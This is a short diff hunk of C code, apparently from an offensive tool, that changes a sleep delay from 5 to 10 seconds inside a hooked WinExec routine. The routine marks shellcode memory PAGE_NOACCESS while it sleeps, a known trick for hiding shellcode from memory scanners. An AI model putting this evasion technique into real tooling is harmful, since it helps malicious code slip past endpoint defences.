@@ -43,7 +43,7 @@ UINT MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
     // Protect shellcode with PAGE_NOACCESS 
     printf("[*] Changing protection to PAGE_NOACCESS\n");
     VirtualProtect(exec_mem, leng, PAGE_NOACCESS, &old);
-    Sleep(5000);
+    Sleep(10000);
 
     // Recall original WinExec after delay to continue execution
     printf("[+] Recalling WinExec...\n");
